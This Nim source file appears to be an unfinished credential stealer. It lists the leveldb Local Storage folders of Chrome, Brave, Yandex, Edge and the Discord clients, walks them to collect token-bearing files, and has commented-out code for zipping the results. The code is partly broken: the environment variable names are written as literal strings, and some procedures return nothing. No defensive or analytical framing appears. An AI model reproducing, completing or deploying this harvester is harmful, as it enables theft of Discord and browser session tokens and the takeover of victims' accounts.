import os
#import times
#import zip/zipfiles
#import nimzip

# For some reason, zip/zipfiles would not let me write multiple files to one zip.
# For now, I will be using nimzip.

type
    BrowserDir = array[5, string]
    DiscDir = array[3, string]

let browserDirectories: BrowserDir = [
    "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
    "\\Yandex\\YandexBrowser\\User Data\\Default",
    "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
    "testdir/"
    ]
    #"\\Opera Software\\Opera Stable\\"
    #]
let discordDirectories: DiscDir = [
    "\\Discord\\Local Storage\\leveldb\\",
    "\\discordptb\\Local Storage\\leveldb\\",
    "\\discordcanary\\Local Storage\\leveldb\\"
]

# Timestamp for zip.
#proc currentTime(): string =
#    let timenow = getTime()
#    return format(timenow, "yyyymmdd-HHMMss")
#timestamp = "results_" & currentTime() & ".zip"
#var zip = zip_open(timestamp, 6, 'w')



# leveldb discovery.
# Currently just finds the directory, as zip functionality isn't working as expected.
proc levelDBfinder() =
    proc collectFiles(x: string): string =
        for i in walkDir(x):
            if i.kind == pcFile:
                echo i
                #z.addFile(timestamp, $i.path)

    proc findRelevantPath(x: string): string =
        var g=""
        if os.dirExists(x):
            for e in walkDir(x):
                if e.kind == pcDir:
                    g.add(findRelevantPath($e.path))
                else:
                    return collectFiles(x)
                    #for f in walkDir(x):
                    #    if f.kind == pcFile:
                    #        z.addFile(timestamp, $f.path)
        discard g

    proc fileCrawlerUno(x: string): string =
        let path = "LOCALAPPDATA" & x
        #let path = x
        if os.dirExists(path):
            findRelevantPath(path)
        else:
            return

    proc fileCrawlerDos(x: string): string =
        let path = "APPDATA" & x
        if os.dirExists(path):
            findRelevantPath(path)
        else:
            return

    for i in browserDirectories:
        let result = fileCrawlerUno(i)
        echo result
    for i in discordDirectories:
        let result = fileCrawlerDos(i)
        echo result

levelDBfinder()